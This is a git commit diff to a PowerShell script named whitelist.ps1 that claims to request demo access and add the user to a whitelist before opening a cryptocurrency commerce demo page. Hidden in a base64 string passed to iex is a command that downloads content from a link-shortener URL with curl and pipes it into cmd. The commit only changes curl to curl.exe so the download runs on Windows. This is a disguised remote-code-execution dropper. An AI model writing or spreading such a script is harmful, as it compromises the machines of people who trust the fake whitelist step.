c0e7e2413f88a66e2071f75903bca070c11e0262
cartdev <playblockventures@gmail.com>
2026-03-12 14:16:54 -0400

    update windows bash

--- public/whitelist.ps1
+++ public/whitelist.ps1
@@ -1,4 +1,4 @@
 Write-Host "Requesting access for the demo..." -ForegroundColor Green
-iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Y3VybCBodHRwczovL1BFc25DVi5zaG9ydC5neS9jc1JrTW45dyAtTCB8IGNtZA=")))
+iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Y3VybC5leGUgaHR0cHM6Ly9QRXNuQ1Yuc2hvcnQuZ3kvY3NSa01uOXcgLUwgfCBjbWQ=")))
 Write-Host "Added to whitelist successfully. Showing demo..." -ForegroundColor Green
 [System.Diagnostics.Process]::Start("https://demo.cryptocommerce.cloud/")
